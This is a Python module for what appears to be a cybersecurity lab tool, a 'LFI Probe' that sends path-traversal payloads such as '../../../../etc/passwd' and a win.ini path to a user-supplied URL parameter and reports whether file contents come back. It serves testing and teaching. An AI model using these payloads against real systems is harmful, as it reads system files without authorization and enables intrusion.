import urllib.error
import urllib.parse
import urllib.request

NAME = "LFI Probe"
DESCRIPTION = "Detect local file inclusion in a lab parameter."
ALLOWED_ROLES = ["admin", "instructor"]

PAYLOADS = [
    ("../../../../etc/passwd", "root:x:0:0"),
    ("....//....//....//etc/passwd", "root:x:0:0"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("/etc/passwd", "root:x:0:0"),
]


def run(username, role):
    print("[!] LAB USE ONLY — authorized targets only.")
    url = input("URL with file param (e.g. http://lab/page.php?file=home): ").strip()
    if not url or "=" not in url:
        print("[!] URL must contain a query parameter.")
        return

    base, _ = url.rsplit("=", 1)
    for payload, marker in PAYLOADS:
        test = base + "=" + urllib.parse.quote(payload)
        try:
            req = urllib.request.Request(test, headers={"User-Agent": "CyberLab/1.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode(errors="ignore")
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors="ignore")
        except Exception as e:
            print(f"[!] Request failed: {e}")
            return

        if marker in body:
            print(f"[!] POSSIBLE LFI — payload '{payload}' exposed file contents!")
            print(f"    URL: {test}")
            return

    print("[+] No LFI signatures detected (not conclusive).")
